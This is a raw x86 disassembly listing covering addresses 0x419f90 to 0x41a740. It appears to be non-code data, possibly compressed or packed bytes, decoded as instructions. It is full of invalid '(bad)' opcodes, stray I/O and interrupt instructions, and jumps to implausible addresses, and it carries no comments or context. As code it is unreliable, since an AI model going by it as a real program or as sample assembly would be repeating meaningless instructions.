  419f90:	add    BYTE PTR [edx+0x32],ah
  419f93:	mov    esi,edi
  419f95:	fisttp WORD PTR [ebx-0x1c168490]
  419f9b:	in     al,dx
  419f9c:	and    al,0x86
  419f9e:	xor    DWORD PTR [eax],eax
  419fa0:	sbb    DWORD PTR [esi],0xfcfd28ce
  419fa6:	mov    eax,0x4a002440
  419fab:	test   eax,0x54322478
  419fb0:	cmp    DWORD PTR [edi+0x458b74f7],0xe7835f56
  419fba:	jb     0x419ffe
  419fbc:	mov    DWORD PTR [edx+esi*2-0x67],edx
  419fc0:	in     eax,dx
  419fc1:	cli    
  419fc2:	bound  esi,QWORD PTR [edx]
  419fc4:	call   0x72c253
  419fc9:	mov    DWORD PTR [edx],ebx
  419fcb:	lods   eax,DWORD PTR ds:[esi]
  419fcc:	fidiv  DWORD PTR [edx+0x66]
  419fcf:	jp     0x419f8b
  419fd1:	jmp    FWORD PTR ds:0x9e876232
  419fd7:	(bad)  
  419fd8:	sub    al,0xe9
  419fda:	inc    esi
  419fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419fdc:	cmp    esp,DWORD PTR [esi+eax*2]
  419fdf:	ret    0x8b53
  419fe2:	sahf   
  419fe3:	into   
  419fe4:	and    al,0xe8
  419fe6:	je     0x41a000
  419fe8:	add    eax,0x6266e900
  419fed:	xchg   DWORD PTR [esi+0x42e82816],ebx
  419ff3:	mov    BYTE PTR ds:0x20bdd700,0x18
  419ffa:	retf   0xee5f
  419ffd:	(bad)  
  419ffe:	aad    0x5e
  41a000:	fist   DWORD PTR [eax-0x21]
  41a003:	in     eax,dx
  41a004:	and    BYTE PTR [edx+esi*1],dl
  41a007:	jge    0x41a04c
  41a009:	and    al,0x7e
  41a00b:	fst    DWORD PTR [ecx+0x6f]
  41a00e:	add    BYTE PTR [ebx],dl
  41a010:	fucompp 
  41a012:	mov    ds,WORD PTR [esi-0x5a81acd0]
  41a018:	sbb    esi,DWORD PTR [esi+ecx*4-0x35912ae8]
  41a01f:	jge    0x419fb4
  41a021:	je     0x41a026
  41a023:	bound  edx,QWORD PTR [eax+0x3a]
  41a026:	or     BYTE PTR [edi+0x7f5164cb],0x1b
  41a02d:	and    ecx,DWORD PTR [ebp-0x53fe0adf]
  41a033:	pop    ebp
  41a034:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a035:	mov    edx,0xf9f51988
  41a03a:	mov    WORD PTR [ecx-0x7a14260b],?
  41a040:	es jmp 0x7e5b8649
  41a046:	cmp    ch,BYTE PTR ds:[ebx+esi*8-0x4f199dfd]
  41a04e:	test   DWORD PTR ds:0xd9004ffa,ebx
  41a054:	test   DWORD PTR ds:0x2650651c,ecx
  41a05a:	and    BYTE PTR [edx+0x31],bh
  41a05d:	pop    es
  41a05e:	lock adc al,0x1b
  41a061:	outs   dx,DWORD PTR ds:[esi]
  41a062:	dec    eax
  41a063:	inc    esi
  41a064:	leave  
  41a065:	shr    DWORD PTR [eax+0x31],0x1b
  41a069:	stos   DWORD PTR es:[edi],eax
  41a06a:	test   DWORD PTR [eax-0x17],ebp
  41a06d:	adc    eax,0x11c96240
  41a072:	add    al,0x0
  41a074:	(bad)  
  41a075:	fldcw  WORD PTR [ecx+0x6e]
  41a078:	dec    esi
  41a079:	push   eax
  41a07a:	and    BYTE PTR cs:[edx+0x1a],bh
  41a07e:	fnstsw WORD PTR [edi+0x70]
  41a081:	cdq    
  41a082:	jmp    0x136ba0d
  41a087:	fnstcw WORD PTR [ecx+0x61e8ef07]
  41a08d:	xor    BYTE PTR [ecx-0x6f],cl
  41a090:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  41a092:	or     DWORD PTR [ecx+0x6b],edx
  41a095:	jg     0x41a098
  41a097:	jmp    0xf1663773
  41a09c:	leave  
  41a09d:	fnstenv [edi+ecx*1-0x27]
  41a0a1:	fisub  DWORD PTR [ebx-0x42ce9e57]
  41a0a7:	retf   
  41a0a8:	popa   
  41a0a9:	fld    DWORD PTR [edi+0x68c15da5]
  41a0af:	jmp    0x38c27a15
  41a0b4:	jle    0x41a10f
  41a0b6:	loope  0x41a0a0
  41a0b8:	adc    DWORD PTR [edi-0x774945ff],ebp
  41a0be:	sti    
  41a0bf:	fsubr  st(1),st
  41a0c1:	leave  
  41a0c2:	inc    eax
  41a0c3:	jmp    0xedea6c06
  41a0c8:	mov    ch,0xce
  41a0ca:	push   0x80d961e9
  41a0cf:	push   ebx
  41a0d0:	push   edx
  41a0d1:	sbb    al,0x16
  41a0d3:	gs pop esp
  41a0d5:	cdq    
  41a0d6:	add    BYTE PTR [eax+eax*1-0x63],ah
  41a0da:	cmc    
  41a0db:	sbb    cl,al
  41a0dd:	lods   al,BYTE PTR ds:[esi]
  41a0de:	xor    al,BYTE PTR [edx]
  41a0e0:	jmp    0x229f1c9f
  41a0e5:	fbstp  TBYTE PTR [esi]
  41a0e7:	pop    esi
  41a0e8:	stos   BYTE PTR es:[edi],al
  41a0e9:	scas   al,BYTE PTR es:[edi]
  41a0ea:	adc    DWORD PTR [ebx-0x6],0x1e
  41a0ee:	mov    DWORD PTR [edi-0x16d71960],eax
  41a0f4:	pop    ss
  41a0f5:	mov    dl,0x19
  41a0f7:	cld    
  41a0f8:	ins    BYTE PTR es:[edi],dx
  41a0f9:	and    DWORD PTR [esi+0xcef396a],esp
  41a0ff:	inc    ebx
  41a100:	add    bl,dh
  41a102:	scas   al,BYTE PTR es:[edi]
  41a103:	mov    ah,0x0
  41a105:	mov    ebx,0x4875bb9a
  41a10a:	fwait
  41a10b:	cmc    
  41a10c:	je     0x41a17c
  41a10e:	dec    esp
  41a10f:	int    0xe8
  41a111:	sbb    al,0x5e
  41a113:	cld    
  41a114:	push   DWORD PTR [eax]
  41a116:	es jg  0x41a10f
  41a119:	xchg   BYTE PTR [ecx],bl
  41a11b:	xor    al,al
  41a11d:	and    BYTE PTR [eax+0x20f80866],dl
  41a123:	das    
  41a124:	dec    eax
  41a125:	int3   
  41a126:	fld    DWORD PTR [eax]
  41a128:	jmp    DWORD PTR [esi-0x74bff3df]
  41a12e:	call   0xbbfc:0x187074bb
  41a135:	in     al,dx
  41a136:	xchg   ebp,eax
  41a137:	add    BYTE PTR [ecx+0x2e919cb],cl
  41a13d:	add    al,al
  41a13f:	sbb    eax,0xecd6c07f
  41a144:	mov    DWORD PTR [esi],ecx
  41a146:	jae    0x41a176
  41a148:	jp     0x41a14b
  41a14a:	cmp    esp,DWORD PTR [esi-0x32]
  41a14d:	call   0x3d37d2
  41a152:	adc    BYTE PTR [esi],ah
  41a154:	mov    eax,ecx
  41a156:	adc    ecx,DWORD PTR [esp+ebp*2+0x0]
  41a15a:	cmp    ebx,DWORD PTR [edx-0x44]
  41a15d:	je     0x41a161
  41a15f:	lods   eax,DWORD PTR ds:[esi]
  41a160:	mov    cl,0x1
  41a162:	sbb    al,0xeb
  41a164:	cwde   
  41a165:	adc    bh,BYTE PTR [ebx]
  41a167:	fld    QWORD PTR [esi-0x4f23df3d]
  41a16d:	add    DWORD PTR [edi+ebp*4+0x59],ebp
  41a171:	ret    
  41a172:	mov    BYTE PTR [ecx],al
  41a174:	and    al,0x8a
  41a176:	stc    
  41a177:	sbb    BYTE PTR [eax+ecx*4],ch
  41a17a:	bound  eax,QWORD PTR [esi]
  41a17c:	sbb    al,0x8a
  41a17e:	and    BYTE PTR [esi+ecx*2],al
  41a181:	mov    BYTE PTR [esi],bl
  41a183:	add    DWORD PTR es:0x54fac515,ecx
  41a18a:	cmp    BYTE PTR [edi],al
  41a18c:	popf   
  41a18d:	mov    BYTE PTR [ebx-0x16091417],bh
  41a193:	ss sbb al,0x34
  41a196:	adc    eax,DWORD PTR [ebp+0x794e2450]
  41a19c:	jo     0x41a1c2
  41a19e:	ins    DWORD PTR es:[edi],dx
  41a19f:	mov    al,0xed
  41a1a1:	xchg   DWORD PTR [eax],eax
  41a1a3:	push   ds
  41a1a4:	out    0x2,al
  41a1a6:	mov    esp,DWORD PTR [esi]
  41a1a8:	fimul  WORD PTR [eax]
  41a1aa:	push   eax
  41a1ab:	push   ecx
  41a1ac:	mov    ecx,0x172aeec
  41a1b1:	add    BYTE PTR [edx+eiz*4+0x62d97c0f],al
  41a1b8:	add    al,BYTE PTR [eax]
  41a1ba:	push   ecx
  41a1bb:	subps  xmm2,XMMWORD PTR [eax]
  41a1be:	pop    eax
  41a1bf:	nop
  41a1c0:	retf   
  41a1c1:	mov    DWORD PTR [ebx+0x7e],ebp
  41a1c4:	cli    
  41a1c5:	mov    WORD PTR [ebx-0x7a],es
  41a1c8:	xor    cl,BYTE PTR [edx-0x2a839db6]
  41a1ce:	jg     0x41a210
  41a1d0:	daa    
  41a1d1:	shl    dh,0x61
  41a1d4:	add    cl,0x5e
  41a1d7:	loop   0x41a219
  41a1d9:	cmp    dl,BYTE PTR gs:[ebx]
  41a1dc:	mov    dh,0x1e
  41a1de:	sbb    BYTE PTR [eax],0xac
  41a1e1:	imul   ecx,DWORD PTR [eiz*2+0x21fdbe98],0xffffff8a
  41a1e9:	or     edi,DWORD PTR [eax]
  41a1eb:	fld    st(5)
  41a1ed:	and    BYTE PTR [eax],dl
  41a1ef:	loop   0x41a239
  41a1f1:	jp     0x41a268
  41a1f3:	data16 fptan 
  41a1f6:	lods   eax,DWORD PTR ds:[esi]
  41a1f7:	and    dl,BYTE PTR [edi]
  41a1f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a1fa:	mov    ebx,DWORD PTR [ecx-0x2f]
  41a1fd:	pop    esi
  41a1fe:	aas    
  41a1ff:	xchg   cl,ch
  41a201:	and    al,0x4c
  41a203:	fstp   QWORD PTR [ebp+ecx*8+0x1a510013]
  41a20a:	jmp    0x41a1b9
  41a20c:	mov    ds:0x61bdeb82,al
  41a211:	sar    DWORD PTR [ebx+0x2c639032],1
  41a217:	pop    eax
  41a218:	mov    bh,0xd
  41a21a:	pop    esp
  41a21b:	ret    0x4f56
  41a21e:	pop    ds
  41a21f:	add    ch,BYTE PTR [edi+0x6b70385d]
  41a225:	and    cl,ch
  41a227:	jno    0x41a23a
  41a229:	fldl2t 
  41a22b:	and    DWORD PTR [edx-0x14a5c126],0x1e
  41a232:	rol    BYTE PTR [eax],0x33
  41a235:	sub    eax,esp
  41a237:	out    dx,al
  41a238:	ja     0x41a297
  41a23a:	cmp    BYTE PTR [eax+0x5b],dh
  41a23d:	and    cl,ch
  41a23f:	popa   
  41a240:	lds    edx,FWORD PTR [ebx-0x24dd7c17]
  41a246:	push   cs
  41a247:	inc    edx
  41a248:	fistp  DWORD PTR [ebp-0x2547c83b]
  41a24e:	(bad)  
  41a24f:	jg     0x41a274
  41a251:	(bad)  
  41a252:	fidivr WORD PTR [esi+0x5e538234]
  41a258:	mov    edi,0x3b00a759
  41a25d:	lds    edi,FWORD PTR [edi]
  41a25f:	add    DWORD PTR [ebx+0x2b],edx
  41a262:	sub    al,0xed
  41a264:	minps  xmm3,XMMWORD PTR [eax-0x16e1a591]
  41a26b:	add    BYTE PTR fs:[eax+0xae9007e],dl
  41a272:	in     al,dx
  41a273:	repnz and eax,0x1c01d542
  41a279:	pop    esi
  41a27a:	sbb    al,0x2
  41a27c:	jne    0xdcc3a30f
  41a282:	sbb    eax,0x823f0a02
  41a287:	add    BYTE PTR [ebx],dl
  41a289:	arpl   WORD PTR [ecx+0x4f5fa0fe],si
  41a28f:	enter  0xe814,0x19
  41a293:	ret    
  41a294:	in     eax,0x78
  41a296:	fst    DWORD PTR [edi-0x3a]
  41a299:	pop    ss
  41a29a:	pop    eax
  41a29b:	lds    edx,FWORD PTR [ecx]
  41a29d:	mov    al,ds:0x8a6a00da
  41a2a2:	mov    ds:0xa875dd8d,al
  41a2a7:	push   ebp
  41a2a8:	lahf   
  41a2a9:	push   ds
  41a2aa:	pusha  
  41a2ab:	not    DWORD PTR [ecx-0x35]
  41a2ae:	into   
  41a2af:	sti    
  41a2b0:	ss loop 0x41a309
  41a2b3:	jne    0x41a292
  41a2b5:	mov    ecx,0x61e90431
  41a2ba:	jg     0x41a2f5
  41a2bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a2bd:	inc    ebp
  41a2be:	jmp    0x9a268532
  41a2c3:	and    al,0xf9
  41a2c5:	mov    cl,0x14
  41a2c7:	push   ss
  41a2c8:	fnsave [eax-0x67]
  41a2cb:	add    BYTE PTR [ecx],dl
  41a2cd:	popa   
  41a2ce:	lahf   
  41a2cf:	add    cl,ch
  41a2d1:	add    dl,ch
  41a2d3:	sub    eax,0x31ecf730
  41a2d8:	push   es
  41a2d9:	jmp    0xdec74d3f
  41a2de:	mov    ah,0xe1
  41a2e0:	sti    
  41a2e1:	cld    
  41a2e2:	jno    0x41a2ca
  41a2e4:	inc    eax
  41a2e5:	jmp    0x9586f4
  41a2ea:	and    al,0xe7
  41a2ec:	mov    BYTE PTR [edx],dl
  41a2ee:	cmp    ebx,ebp
  41a2f0:	aaa    
  41a2f1:	add    cl,BYTE PTR [edx]
  41a2f3:	fiadd  DWORD PTR [eax]
  41a2f5:	jne    0x41a2fc
  41a2f7:	leave  
  41a2f8:	into   
  41a2f9:	mov    ecx,0xd8d3
  41a2fe:	jo     0x41a319
  41a300:	cmc    
  41a301:	icebp  
  41a302:	inc    esi
  41a303:	sahf   
  41a304:	and    al,0x20
  41a306:	cdq    
  41a307:	pop    esi
  41a308:	push   eax
  41a309:	and    al,0xaf
  41a30b:	add    DWORD PTR [edx-0x2],ebp
  41a30e:	inc    esp
  41a30f:	or     eax,0x860b8441
  41a314:	and    BYTE PTR [ebx-0x729b46b1],cl
  41a31a:	div    ebp
  41a31c:	and    al,ch
  41a31e:	nop
  41a31f:	mov    eax,DWORD PTR [eax]
  41a321:	add    BYTE PTR [eax],cl
  41a323:	add    bh,ah
  41a325:	jae    0x41a2b8
  41a327:	mov    eax,ds:0xd3917448
  41a32c:	mov    eax,0xd978e8
  41a331:	cmp    edi,DWORD PTR [ebx]
  41a333:	mov    BYTE PTR [ebp-0x52b4ffce],ah
  41a339:	pop    edx
  41a33a:	pop    ebp
  41a33b:	mov    al,ds:0x394cc058
  41a340:	loop   0x41a342
  41a342:	mov    al,0x4a
  41a344:	add    dh,dl
  41a346:	push   ebp
  41a347:	sar    ah,0x7a
  41a34a:	in     al,dx
  41a34b:	pop    ds
  41a34c:	fild   DWORD PTR [eax]
  41a34e:	add    ch,ch
  41a350:	popa   
  41a351:	jmp    0x41a2e0
  41a353:	xabort 0xf6
  41a356:	inc    DWORD PTR [eax+eax*1-0x1]
  41a35a:	jp     0x41a396
  41a35c:	fld    DWORD PTR [edi-0x2f4e07b]
  41a362:	jmp    DWORD PTR [edx-0x2e]
  41a365:	push   ebp
  41a366:	mov    DWORD PTR [eax+ebx*4+0x69],esp
  41a36a:	call   0x463594
  41a36f:	fiadd  WORD PTR [edx-0x52]
  41a372:	in     eax,dx
  41a373:	arpl   WORD PTR [edx],ax
  41a375:	add    BYTE PTR [ebx-0x30ddd21],cl
  41a37b:	in     eax,dx
  41a37c:	cmc    
  41a37d:	sti    
  41a37e:	lds    esp,FWORD PTR [edx+0x2]
  41a381:	inc    eax
  41a382:	inc    edi
  41a383:	push   edi
  41a384:	imul   esi,DWORD PTR [ebx],0xc6bdc9c0
  41a38a:	dec    ebp
  41a38c:	ret    0x733d
  41a38f:	retf   
  41a390:	push   0x19
  41a392:	arpl   WORD PTR [ebx+0x2],sp
  41a395:	pop    esi
  41a396:	adc    al,0xca
  41a398:	xor    eax,0xad00ff69
  41a39d:	push   edx
  41a39e:	push   ebp
  41a39f:	mov    DWORD PTR [eax+ebp*1+0x6a],edx
  41a3a3:	call   0x47151c
  41a3a8:	faddp  st(2),st
  41a3aa:	js     0x41a386
  41a3ac:	fisttp WORD PTR [ebp-0x2c]
  41a3af:	out    0xf1,eax
  41a3b1:	iret   
  41a3b2:	add    eax,0x717f0400
  41a3b7:	aam    0x62
  41a3b9:	dec    esi
  41a3ba:	push   ss
  41a3bb:	mov    esp,DWORD PTR [edi]
  41a3bd:	(bad)  
  41a3be:	push   esp
  41a3bf:	dec    edi
  41a3c0:	fld    DWORD PTR [esi+ebx*2]
  41a3c3:	gs dec edx
  41a3c5:	pop    esp
  41a3c6:	mov    ch,0xff
  41a3c8:	push   ebp
  41a3c9:	jle    0x41a38f
  41a3cb:	jae    0x41a3d8
  41a3cd:	rol    BYTE PTR ds:0x59bf1b5e,cl
  41a3d3:	mov    DWORD PTR [esi-0x7f],ecx
  41a3d6:	loopne 0x41a3b7
  41a3d8:	bound  eax,QWORD PTR [edx]
  41a3da:	add    BYTE PTR [esi-0x6b],dl
  41a3dd:	fldcw  WORD PTR [esi-0x14]
  41a3e0:	es out dx,al
  41a3e2:	or     DWORD PTR [esi],edx
  41a3e4:	mov    ds:0xe8f35ed9,al
  41a3e9:	popf   
  41a3ea:	rcl    DWORD PTR [ebx+0x27],1
  41a3ed:	sahf   
  41a3ee:	sar    ebx,0x5
  41a3f1:	adc    al,0xea
  41a3f3:	repnz push eax
  41a3f5:	and    esi,ebx
  41a3f7:	inc    ebx
  41a3f8:	bound  ebx,QWORD PTR [esi-0x56]
  41a3fb:	js     0x41a463
  41a3fd:	enter  0xdeb0,0x0
  41a401:	pusha  
  41a402:	pusha  
  41a403:	lods   al,BYTE PTR ds:[esi]
  41a404:	push   ds
  41a405:	sub    DWORD PTR ds:0xa8ae4865,edx
  41a40b:	pusha  
  41a40c:	inc    eax
  41a40d:	into   
  41a40e:	sbb    ch,BYTE PTR ds:0xf560c4e8
  41a414:	call   0xf2c249fd
  41a419:	push   eax
  41a41a:	pop    ebp
  41a41b:	fld    DWORD PTR [ebx+0x62]
  41a41e:	data16 mov ch,0xd7
  41a421:	mov    ebp,0x6203e014
  41a426:	bound  ebp,QWORD PTR [ebp+0xa5de8e0]
  41a42c:	repz mov ss,WORD PTR [ebx]
  41a42f:	call   0x6243:0xd95970f2
  41a436:	pusha  
  41a437:	ins    DWORD PTR es:[edi],dx
  41a438:	and    esi,DWORD PTR [edi+0x13]
  41a43b:	sub    ebx,DWORD PTR [esi-0x5e]
  41a43e:	sbb    al,0x90
  41a440:	adc    al,0xdd
  41a442:	popf   
  41a443:	sbb    BYTE PTR [eax+0x54b9fda0],al
  41a449:	jmp    0x41a42d
  41a44b:	jg     0x41a4ab
  41a44d:	cmp    al,BYTE PTR [ecx+edi*1-0x644d9dfd]
  41a454:	mov    esp,0x6200ad22
  41a459:	adc    eax,0x94d9ed5a
  41a45e:	stos   DWORD PTR es:[edi],eax
  41a45f:	push   ebx
  41a460:	push   ebx
  41a461:	and    DWORD PTR [eax-0xe],0xab660053
  41a468:	sti    
  41a469:	cld    
  41a46a:	jge    0x41a457
  41a46c:	inc    eax
  41a46d:	jmp    0xfa4ebb58
  41a472:	push   ss
  41a473:	sub    DWORD PTR [ecx+eiz*1],0xb94e5ea7
  41a47a:	jbe    0x41a470
  41a47c:	bound  esp,QWORD PTR [eax-0x68]
  41a47f:	adc    ah,ah
  41a481:	(bad)  
  41a482:	out    dx,al
  41a483:	adc    edi,esp
  41a485:	pop    es
  41a486:	pop    edi
  41a487:	xchg   edi,eax
  41a488:	lock mulps xmm3,XMMWORD PTR [ebp+eax*1-0x1168b0f9]
  41a491:	je     0x41a418
  41a493:	adc    eax,0xdc287063
  41a498:	call   0xfc556c76
  41a49d:	cs mov bl,0x15
  41a4a0:	add    ecx,ebp
  41a4a2:	fcom   QWORD PTR [edx+0x75]
  41a4a5:	neg    DWORD PTR [esi]
  41a4a7:	lahf   
  41a4a8:	cld    
  41a4a9:	out    0xda,al
  41a4ab:	and    edi,DWORD PTR [eax]
  41a4ad:	push   ds
  41a4ae:	arpl   WORD PTR [ebx+edx*8-0x7683398e],bx
  41a4b5:	xchg   edi,eax
  41a4b6:	js     0x41a4b2
  41a4b8:	jo     0x41a478
  41a4ba:	pusha  
  41a4bb:	(bad)  [ebp+0x4ffa7d9c]
  41a4c1:	and    BYTE PTR [ecx-0x27],ah
  41a4c4:	test   DWORD PTR [ecx],ebp
  41a4c6:	(bad)  
  41a4c8:	xchg   DWORD PTR [eax+eax*1+0x38b3e545],esp
  41a4cf:	jg     0x41a4f5
  41a4d1:	or     al,0x0
  41a4d3:	hlt    
  41a4d4:	xor    BYTE PTR [ecx+0x558ee5c8],cl
  41a4da:	or     esp,DWORD PTR [ebx-0x69]
  41a4dd:	jne    0x41a4e0
  41a4df:	cmp    edx,DWORD PTR [ebx+0x3613fc46]
  41a4e5:	hlt    
  41a4e6:	add    DWORD PTR [ebx],ecx
  41a4e8:	pop    ebx
  41a4e9:	mov    esp,0x46951574
  41a4ee:	cld    
  41a4ef:	sub    al,0x51
  41a4f1:	retf   
  41a4f2:	cmp    ecx,esp
  41a4f4:	fadd   DWORD PTR [ebp-0x29]
  41a4f7:	jo     0x41a547
  41a4f9:	mov    WORD PTR [ebp+0x12],dx
  41a4fd:	in     al,0x2c
  41a4ff:	xor    al,0xd6
  41a501:	add    BYTE PTR [ebp-0x674cf6da],cl
  41a507:	retf   
  41a508:	aad    0x0
  41a50a:	call   0x3cab44
  41a50f:	inc    esi
  41a510:	push   ss
  41a511:	jo     0x41a524
  41a513:	cmp    BYTE PTR [ebx-0x2646cf04],al
  41a519:	bound  ecx,QWORD PTR [ecx]
  41a51b:	dec    ebp
  41a51c:	fmul   QWORD PTR [ecx+0x7513e3c8]
  41a522:	add    DWORD PTR [ebx+0x525b5aa8],edi
  41a528:	sbb    eax,0xdbcfec7b
  41a52d:	add    BYTE PTR [eax],al
  41a52f:	add    al,cl
  41a531:	stos   BYTE PTR es:[edi],al
  41a532:	push   edx
  41a533:	push   edi
  41a534:	fcompp 
  41a536:	sti    
  41a537:	dec    DWORD PTR [ebx+0x674487aa]
  41a53d:	adc    DWORD PTR [eax+0x33],0x4c83ad50
  41a544:	xchg   edi,eax
  41a545:	int    0xfd
  41a547:	adc    eax,0x40ec2b
  41a54c:	bound  edi,QWORD PTR [ebx+0x2a]
  41a54f:	fs je  0x41a594
  41a552:	add    BYTE PTR [edi-0x7cebe162],al
  41a558:	and    al,BYTE PTR [edi+0x1ea68b13]
  41a55e:	xor    BYTE PTR [edi-0x27],cl
  41a561:	bnd jp 0x41a5af
  41a564:	jle    0x41a504
  41a566:	fmul   QWORD PTR [edx]
  41a568:	add    al,BYTE PTR ss:[eax]
  41a56b:	test   BYTE PTR [edx],ah
  41a56d:	scas   al,BYTE PTR es:[edi]
  41a56e:	add    DWORD PTR [edx+0x5e],ebp
  41a571:	lods   eax,DWORD PTR ds:[esi]
  41a572:	dec    eax
  41a573:	and    al,0x4e
  41a575:	repz push esp
  41a577:	std    
  41a578:	adc    eax,0xf50bc884
  41a57d:	sub    eax,0x2a21120
  41a582:	ja     0x41a573
  41a584:	mov    WORD PTR [edi],?
  41a586:	sbb    dh,BYTE PTR [eax+0x70]
  41a589:	ret    0xba04
  41a58c:	popa   
  41a58d:	add    DWORD PTR [eax],eax
  41a58f:	add    bh,bl
  41a591:	out    dx,al
  41a592:	sub    BYTE PTR [eax],bl
  41a594:	add    BYTE PTR [ecx+0x2e0d5644],cl
  41a59a:	jb     0x41a614
  41a59c:	int    0xca
  41a59e:	outs   dx,DWORD PTR ds:[esi]
  41a59f:	sar    dh,1
  41a5a1:	lods   eax,DWORD PTR ds:[esi]
  41a5a2:	jbe    0x41a568
  41a5a4:	jb     0x41a5fd
  41a5a6:	sub    al,0xfc
  41a5a8:	mov    ah,BYTE PTR [esi]
  41a5aa:	(bad)  
  41a5ab:	adc    BYTE PTR [ecx+0x32],dl
  41a5ae:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5af:	rol    DWORD PTR [eax+0x43812ea6],cl
  41a5b5:	ds cs push eax
  41a5b8:	mov    esp,DWORD PTR [esi]
  41a5ba:	(bad)  
  41a5bb:	push   0x7d040850
  41a5c0:	imul   eax,DWORD PTR [esi-0x1e],0xffffffeb
  41a5c4:	adc    al,BYTE PTR [edx+0x6243f6d9]
  41a5ca:	push   ebp
  41a5cb:	sub    bh,BYTE PTR [eax+0x6c]
  41a5ce:	fs mov esi,0xa65e7627
  41a5d4:	daa    
  41a5d5:	jle    0x41a580
  41a5d7:	je     0x41a619
  41a5d9:	xchg   BYTE PTR [ebp+0x11],dh
  41a5dc:	mov    dl,BYTE PTR [edx]
  41a5de:	fucompp 
  41a5e0:	xchg   ebp,ebp
  41a5e2:	test   esp,ebx
  41a5e4:	pop    ecx
  41a5e5:	push   esi
  41a5e6:	pop    esi
  41a5e7:	sub    BYTE PTR cs:[edx-0x54],cl
  41a5eb:	cmp    edi,ebp
  41a5ed:	cs pop esp
  41a5ef:	scas   al,BYTE PTR es:[edi]
  41a5f0:	(bad)  
  41a5f1:	fcom   DWORD PTR [ebp+eax*1+0x2e5eb24c]
  41a5f8:	sub    BYTE PTR [eax],al
  41a5fa:	xchg   esi,eax
  41a5fb:	test   eax,0xa93e476c
  41a600:	sbb    DWORD PTR [ecx+0x541db5a1],eax
  41a606:	js     0x41a618
  41a608:	mov    ds:0x29ea7e18,eax
  41a60d:	add    al,0xe1
  41a60f:	sbb    BYTE PTR ds:0x7f0bdb08,bl
  41a615:	and    ebx,ebx
  41a617:	pushf  
  41a618:	int    0x43
  41a61a:	jmp    0x41a5b0
  41a61c:	lds    eax,FWORD PTR [edi+0x13]
  41a61f:	pop    edx
  41a620:	test   eax,0xc019e203
  41a625:	pop    ebx
  41a626:	loop   0x41a68e
  41a628:	add    BYTE PTR [ebx],0x71
  41a62b:	mov    edx,0xa89461ab
  41a630:	mov    eax,0xe8563bdb
  41a635:	add    ebx,ebx
  41a637:	or     BYTE PTR [edi+0x57],ch
  41a63a:	inc    esi
  41a63b:	mov    ecx,0xd13e5f6e
  41a640:	add    dl,ch
  41a642:	adc    eax,0x9a6a2cb5
  41a647:	jmp    0x5b9db94b
  41a64c:	(bad)  
  41a64d:	jmp    0x24c97fb3
  41a652:	sub    DWORD PTR [edx+0x76],ecx
  41a655:	call   0x6d1b06bb
  41a65a:	sub    BYTE PTR [ebx+0x6000277b],cl
  41a660:	push   cs
  41a661:	xchg   esp,esp
  41a663:	test   eax,0xa6e9447e
  41a668:	mov    eax,ds:0x5b1d7301
  41a66d:	jno    0x41a694
  41a66f:	pop    esi
  41a670:	bound  edi,QWORD PTR [eax-0x5]
  41a673:	mov    DWORD PTR [ecx-0x429231fb],esp
  41a679:	adc    DWORD PTR [ecx],ebp
  41a67b:	data16 ja 0x41a607
  41a67e:	sub    bl,BYTE PTR [esi+edx*2+0x70]
  41a682:	loope  0x41a60b
  41a684:	pusha  
  41a685:	inc    ebp
  41a686:	add    eax,0x45366036
  41a68b:	je     0x41a626
  41a68d:	add    BYTE PTR [edi],al
  41a68f:	pop    ecx
  41a690:	cdq    
  41a691:	or     al,0xf
  41a693:	dec    ebx
  41a694:	call   0xf740:0x563fc924
  41a69b:	inc    edi
  41a69c:	pusha  
  41a69d:	inc    ebp
  41a69e:	lds    edx,FWORD PTR [ebp+0x77]
  41a6a1:	mov    DWORD PTR [edx],ebp
  41a6a3:	push   esi
  41a6a4:	fdiv   QWORD PTR [ebx-0x4569dd6]
  41a6aa:	fld    QWORD PTR [ebp-0x3b]
  41a6ad:	push   ebx
  41a6ae:	pop    esi
  41a6af:	lods   al,BYTE PTR ds:[esi]
  41a6b0:	fnsave [ebx-0x7267256]
  41a6b6:	fmulp  st(6),st
  41a6b8:	cdq    
  41a6b9:	or     al,BYTE PTR [eax]
  41a6bb:	or     BYTE PTR [ecx],ah
  41a6bd:	or     BYTE PTR [eax+0x34],dl
  41a6c0:	xchg   ecx,eax
  41a6c1:	and    al,0x1c
  41a6c3:	add    ah,cl
  41a6c5:	std    
  41a6c6:	aad    0xf
  41a6c8:	in     al,dx
  41a6c9:	xchg   edi,eax
  41a6ca:	adc    BYTE PTR [ebx+0xf50d98f],al
  41a6d0:	lods   al,BYTE PTR ds:[esi]
  41a6d1:	cwde   
  41a6d2:	or     bh,bh
  41a6d4:	out    dx,eax
  41a6d5:	mov    ch,0x28
  41a6d7:	add    edi,DWORD PTR [ebp+eiz*4-0x3]
  41a6db:	(bad)  
  41a6dc:	enter  0x821,0x8d
  41a6e0:	pop    es
  41a6e1:	mov    dh,0x30
  41a6e3:	call   0x3ccf9e
  41a6e8:	xchg   BYTE PTR [ecx-0x79cce7dc],bl
  41a6ee:	into   
  41a6ef:	add    DWORD PTR [ebx],ecx
  41a6f1:	pop    DWORD PTR [edi+0x24]
  41a6f4:	pop    edi
  41a6f5:	sub    eax,0xd9fad269
  41a6fa:	mov    DWORD PTR [edi+ebp*2-0x37],eax
  41a6fe:	pop    ebp
  41a6ff:	pop    esi
  41a700:	jb     0x41a6f4
  41a702:	push   edi
  41a703:	mov    edi,DWORD PTR [eax+0x57c47ba0]
  41a709:	fild   DWORD PTR [eax]
  41a70b:	add    BYTE PTR [eax],cl
  41a70d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a70e:	push   edx
  41a70f:	mov    edi,edx
  41a711:	adc    eax,DWORD PTR [esi]
  41a713:	add    ebx,esp
  41a715:	ret    0xffc7
  41a718:	aam    0x91
  41a71a:	inc    ebp
  41a71b:	add    DWORD PTR ds:0x7f7520d7,edi
  41a721:	aad    0xfb
  41a723:	mov    esp,0x4485b7
  41a728:	add    BYTE PTR [esi-0x6100b015],ch
  41a72e:	int    0xe
  41a730:	inc    eax
  41a731:	mov    eax,DWORD PTR [ebx]
  41a733:	call   FWORD PTR [edi]
  41a735:	bound  ebp,QWORD PTR ds:0x25630044
  41a73b:	adc    eax,0xeccadfe8
  41a740:	cld    
